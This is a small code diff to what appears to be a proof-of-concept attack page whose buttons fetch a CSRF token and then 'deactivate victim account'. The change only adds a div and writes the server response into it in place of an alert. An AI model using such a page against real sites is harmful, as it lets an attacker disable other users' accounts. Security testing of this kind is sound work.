@@ -11,6 +11,7 @@
 <button type="button" onclick="get_csrf_token()">Get csrf to deactivate victim account!!!</button>
   <div id="demo4"></div>
 <button type="button" onclick="deactivate()">Now deactivate victim account!!!</button>
+  <div id="demo5"></div>
 </div>
 
 <script>
@@ -54,7 +55,7 @@ function deactivate(){
   var xhttp = new XMLHttpRequest();
     xhttp.onreadystatechange = function() {
     if (this.readyState == 4 && this.status == 200) {
-          alert(xhttp.responseText);
+          document.getElementById("demo5").innerHTML = xhttp.responseText;
     }
   };
   var username = document.getElementById("demo3").innerText;
